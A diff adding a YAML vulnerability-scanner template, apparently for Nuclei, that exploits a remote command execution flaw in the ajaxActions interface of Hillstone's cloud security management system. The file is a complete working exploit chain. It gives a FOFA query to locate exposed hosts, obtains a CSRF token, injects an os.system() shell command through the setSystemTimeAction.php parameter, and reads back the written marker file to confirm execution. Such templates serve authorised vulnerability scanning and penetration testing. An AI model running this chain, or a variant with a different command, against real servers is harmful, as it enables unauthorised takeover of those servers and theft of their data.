@@ -1,0 +1,49 @@
+id: SS-ajaxActions-RCE
+
+info:
+  name: 山石网科云鉴安全管理系统ajaxActions接口处存在RCE漏洞,恶意攻击者可能利用此漏洞执行恶意命令，获取服务器敏感信息，最终可能导致服务器失陷。
+  author: WLF
+  severity: high
+  metadata: 
+    fofa-query: body=山石云鉴主机安全管理系统||icon_hash="572290418"
+variables:
+  filename: "{{to_lower(rand_base(10))}}"
+  boundary: "{{to_lower(rand_base(20))}}"
+http:
+  - raw:
+      - |
+        GET /master/ajaxActions/getTokenAction.php HTTP/1.1
+        Host: {{Hostname}}
+        Content-Type: application/x-www-form-urlencoded
+        User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/83.0.4103.116 Safari/537.36
+
+      - |
+        POST /master/ajaxActions/setSystemTimeAction.php?token_csrf={{path}} HTTP/1.1
+        Host: {{Hostname}}
+        User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/83.0.4103.116 Safari/537.36
+        Accept-Encoding: gzip, deflate
+        Accept: */*
+        Connection: close
+        Content-Type: application/x-www-form-urlencoded
+        Content-Length: 84
+
+        param=os.system('echo 8888881 > /opt/var/majorsec/installation/master/runtime/img/config')
+
+      - |
+        GET /master/img/config HTTP/1.1
+        Host: {{Hostname}}
+        User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/83.0.4103.116 Safari/537.36
+
+    extractors:
+      - type: regex
+        name: path
+        part: body
+        group: 1
+        regex:
+           - '(\w*)'
+        internal: true
+
+    matchers:
+      - type: dsl
+        dsl:
+          - status_code==200 && contains_all(body,"8888881")
